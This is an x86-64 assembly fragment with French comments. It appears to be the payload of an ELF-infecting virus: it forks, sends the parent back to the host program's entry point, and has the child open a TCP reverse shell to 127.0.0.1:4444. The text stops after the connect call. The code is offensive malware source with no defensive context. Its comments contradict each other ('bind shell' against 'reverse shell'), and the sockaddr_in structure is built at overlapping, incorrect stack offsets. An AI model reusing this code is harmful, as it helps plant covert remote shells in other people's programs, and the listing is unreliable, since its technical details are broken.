
BITS 64

_start:
    ; ===== fork() =====
    xor     rax, rax
    mov     al, 57              ; syscall fork = 57
    syscall

    ; rax = 0  → fils   → bind shell
    ; rax > 0  → père   → retour à e_entry
    test    rax, rax
    jnz     retour_pere

    ; ===== FILS — reverse shell =====

    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41          ; syscall socket = 41
    xor     rdi, rdi
    mov     dil, 2          ; AF_INET = 2 (IPv4)
    xor     rsi, rsi
    mov     sil, 1          ; SOCK_STREAM = 1 (TCP)
    xor     rdx, rdx        ; protocole = 0
    syscall
    mov     r12, rax        ; on sauvegarde le socket dans r12

    ; connect(sockfd, {AF_INET, PORT, IP}, 16)
    xor     rax, rax
    push    rax             ; padding (8 octets à 0)
    mov     dword [rsp+4], 0x0100007f  ; IP 127.0.0.1 en little-endian
    mov     word  [rsp+6],  0x5C11     ; port 4444 en big-endian
    mov     word  [rsp+8],  0x0002     ; AF_INET = 2 (IPv4)
    mov     rsi, rsp        ; rsi = pointeur vers sockaddr_in
    mov     rax, 42         ; syscall connect = 42
    mov     rdi, r12        ; sockfd
    mov     rdx, 16         ; taille de sockaddr_in
    syscall

